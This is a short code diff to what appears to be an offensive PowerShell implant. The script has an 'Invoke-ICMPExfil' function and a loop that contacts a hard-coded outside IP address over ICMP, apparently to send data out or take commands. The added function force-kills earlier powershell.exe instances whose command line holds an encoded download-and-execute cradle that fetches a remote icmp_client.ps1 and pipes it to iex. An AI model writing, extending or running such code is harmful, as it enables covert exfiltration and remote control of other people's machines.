@@ -34,6 +34,13 @@ Function Invoke-ICMPExfil {
     End { }
 }
 
+Function Stop-PreviousProcesses {
+    [CmdletBinding()]
+    Param ()
+        Get-WmiObject win32_process -filter 'name="powershell.exe"' | Select-Object ProcessId, CommandLine | Where-Object {$_.CommandLine -like "*aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA*"} | ForEach-Object { if ($_.ProcessId -ne $PID) { Stop-Process -Id $_.ProcessId -Force } }
+}
+
+Stop-PreviousProcesses
 $sleep = 10; $target = "104.248.16.121"
 while ($true) {
     $ICMPClient = New-Object System.Net.NetworkInformation.Ping
